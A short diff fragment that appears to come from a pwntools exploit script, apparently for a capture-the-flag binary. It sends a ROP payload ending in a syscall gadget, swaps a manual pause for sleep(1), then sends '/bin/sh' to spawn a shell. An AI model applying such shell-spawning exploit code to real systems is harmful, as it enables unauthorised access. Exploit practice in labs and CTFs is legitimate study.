@@ -30,7 +30,7 @@ payload += p64( syscall )
 
 #gdb.attach( p )
 p.sendline( payload )
-input('>')
+sleep(1)
 p.sendline(b'/bin/sh\x00')
 
 
